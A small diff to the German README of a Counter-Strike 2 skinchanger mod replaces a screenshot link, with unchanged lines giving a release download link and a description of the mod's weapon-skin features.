@@ -1,7 +1,8 @@
 *Deutsch:*
 
 # CS2 Skinchanger
-![image](https://github.com/user-attachments/assets/26c6d45e-1a64-4cf0-a7e1-18794ca1b44a)
+![image](https://github.com/user-attachments/assets/0c89607d-864f-48ff-83ae-01cce1c5ab0a)
+
 
 ### [Letzte Version herunterladen](https://github.com/thiagochag/cs2-skinchanger/releases/download/cs2-skinchanger/last.release.zip)
 *CS2 Skinchanger* ist eine Modifikation für das Spiel Counter-Strike 2, die es Spielern erlaubt, das Aussehen ihrer Waffen und Ausrüstung mit ein paar Klicks zu verändern. Mit dieser Modifikation können die Spieler verschiedene Waffenmodelle und Skins auswählen, sowie Schussgeräusche und Animationen (in naher Zukunft) anpassen.
